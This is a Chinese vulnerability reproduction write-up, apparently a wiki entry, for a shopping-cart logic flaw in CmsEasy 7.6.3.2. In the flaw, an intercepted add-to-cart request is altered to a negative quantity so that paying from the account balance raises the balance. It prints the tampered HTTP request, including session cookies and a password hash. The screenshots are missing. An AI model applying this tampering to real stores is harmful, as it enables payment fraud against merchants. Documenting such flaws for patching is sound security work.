CmsEasy 7.6.3.2\_20200422 逻辑漏洞
==================================

一、漏洞简介
------------

二、漏洞影响
------------

CmsEasy 7.6.3.2

三、复现过程
------------

-   1.登录任意账号    图片 1.png

-   2.点击任意产品    图片 2.png

-   3.点开任意一个产品，前提是有余量    图片 3.png

-   4.输入任意正常数量，burp开启抓包，点击添加到购物车    图片 4.png

-   5.将抓到的包中的最后一个数字改为负数    图片 5.png    图片 6.png    然后放包

```{=html}
<!-- -->
```
    GET /index.php?case=archive&act=doorders&aid=527&datatype=&thisnum=-100 HTTP/1.1
    Host: www.0-sec.org
    Accept: */*
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3314.0 Safari/537.36 SE 2.X MetaSr 1.0
    Referer: http://localhost/index.php?case=archive&act=show&aid=527
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=5j671r8cg9kfppbkpl7i0n1te0; loginfalse=0; login_username=admin; login_password=787cc8f99d30dc9cbeeadd77f99efb84; ce_orders_cookie=TL%2BA8RODL9PeNwoN
    Connection: close

-   6.此时可以看到购物车中为负数    图片 7.png

-   7.查看个人中心中的余额，为5600    图片 8.png

-   8.点击购物车    图片 9.png

-   9.点击下图内容    图片 10.png

-   10.填写完成之后，点击在线支付    图片 11.png

-   11.选择余额支付，点击购买    图片 12.png

-   12.购买成功    图片 13.png

-   13.回到个人中心，可以看到余额的变化    图片 14.png
